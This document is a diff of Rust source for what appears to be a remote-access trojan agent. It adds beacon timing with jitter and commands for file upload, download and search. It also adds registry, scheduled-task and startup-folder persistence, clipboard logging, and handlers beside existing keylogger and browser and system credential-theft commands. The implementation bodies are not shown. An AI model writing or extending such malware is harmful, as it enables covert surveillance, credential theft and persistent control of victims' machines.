@@ -1,10 +1,32 @@
 use log::{info, error};
 use std::process::Command;
 use std::time::Instant;
-use std::sync::OnceLock;
+use std::sync::{OnceLock, Arc};
+use tokio::sync::RwLock;
 use serde::{Deserialize, Serialize};
 use base64::Engine;
 use crate::keylogger::KeyLogger;
+
+#[derive(Debug, Clone)]
+pub struct BeaconConfig {
+    pub sleep_ms: u64,
+    pub jitter_pct: f64,
+}
+
+impl Default for BeaconConfig {
+    fn default() -> Self {
+        Self {
+            sleep_ms: 10000,
+            jitter_pct: 0.33,
+        }
+    }
+}
+
+static BEACON_CONFIG: OnceLock<Arc<RwLock<BeaconConfig>>> = OnceLock::new();
+
+pub fn get_beacon_config() -> Arc<RwLock<BeaconConfig>> {
+    BEACON_CONFIG.get_or_init(|| Arc::new(RwLock::new(BeaconConfig::default()))).clone()
+}
 
 static KEYLOGGER: OnceLock<KeyLogger> = OnceLock::new();
 
@@ -74,6 +96,27 @@ pub enum CommandType {
     #[serde(rename = "keylogger_clear")]
     KeyloggerClear,
 
+    #[serde(rename = "download")]
+    Download { path: String },
+
+    #[serde(rename = "upload")]
+    Upload { path: String, data: String },
+
+    #[serde(rename = "search_files")]
+    SearchFiles { root: String, pattern: String, max_depth: Option<u32> },
+
+    #[serde(rename = "persist_registry")]
+    PersistRegistry,
+
+    #[serde(rename = "persist_schtask")]
+    PersistScheduledTask,
+
+    #[serde(rename = "persist_startup")]
+    PersistStartupFolder,
+
+    #[serde(rename = "persist_remove")]
+    PersistRemove,
+
     #[serde(rename = "credentials_browser")]
     CredentialsBrowser,
 
@@ -82,6 +125,18 @@ pub enum CommandType {
 
     #[serde(rename = "credentials_all")]
     CredentialsAll,
+
+    #[serde(rename = "config_beacon")]
+    ConfigBeacon { sleep_ms: u64, jitter_pct: f64 },
+
+    #[serde(rename = "clipboard_start")]
+    ClipboardStart,
+
+    #[serde(rename = "clipboard_stop")]
+    ClipboardStop,
+
+    #[serde(rename = "clipboard_logs")]
+    ClipboardLogs,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -126,6 +181,11 @@ impl Executor {
             CommandType::KeyloggerStop => Self::keylogger_stop().await,
             CommandType::KeyloggerLogs => Self::keylogger_logs().await,
             CommandType::KeyloggerClear => Self::keylogger_clear().await,
+            CommandType::Download { path } => Self::download_file(path).await,
+            CommandType::Upload { path, data } => Self::upload_file(path, data).await,
+            CommandType::SearchFiles { root, pattern, max_depth } => {
+                Self::search_files(root, pattern, *max_depth).await
+            }
             CommandType::CredentialsBrowser => Self::credentials_browser().await,
             CommandType::CredentialsSystem => Self::credentials_system().await,
             CommandType::CredentialsAll => Self::credentials_all().await,
